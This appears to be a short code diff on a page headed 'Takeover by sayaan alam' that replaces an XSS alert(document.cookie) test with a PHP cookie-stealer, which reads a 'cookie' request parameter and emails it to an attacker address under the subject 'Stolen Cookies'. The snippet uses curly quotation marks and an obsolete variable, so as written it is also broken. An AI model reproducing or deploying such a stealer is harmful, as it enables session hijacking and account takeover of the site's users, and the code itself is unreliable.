@@ -1,2 +1,4 @@
 <h1>Takeover by sayaan alam</h1>
-<script>alert(document.cookie)</script>
+<?php
+$cookie = $HTTP_GET_VARS[“cookie”]; mail(“hackerid@mailprovider.com”, “Stolen Cookies”, $cookie);
+?>
